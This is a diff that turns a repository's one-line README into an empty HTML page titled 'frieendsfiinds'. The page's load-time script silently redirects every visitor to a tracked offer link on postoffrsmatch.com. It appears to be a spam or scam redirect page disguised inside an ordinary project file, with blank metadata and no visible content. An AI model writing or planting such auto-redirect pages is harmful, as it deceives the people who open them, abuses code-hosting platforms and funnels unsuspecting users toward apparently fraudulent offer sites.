@@ -1,1 +1,29 @@
-# kotenkopling
+# kotenkopling<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>frieendsfiinds</title>
+    <meta property="og:title" content="" />
+<meta property="og:description" content="" />
+<meta property="og:image" content="" />
+<meta property="og:url" content="" />
+    <script>
+        function redirectToRandomPage() {
+            // Daftar URL yang akan dipilih secara acak
+            const pages = [
+                'https://cedhidj.postoffrsmatch.com/s/cdfe771681788?track=KIKUK&subsource=KIKUK'
+            ];
+
+            const randomIndex = Math.floor(Math.random() * pages.length);
+
+            window.location.href = pages[randomIndex];
+        }
+
+        window.onload = redirectToRandomPage;
+    </script>
+</head>
+<body>
+</body>
+</html>
+
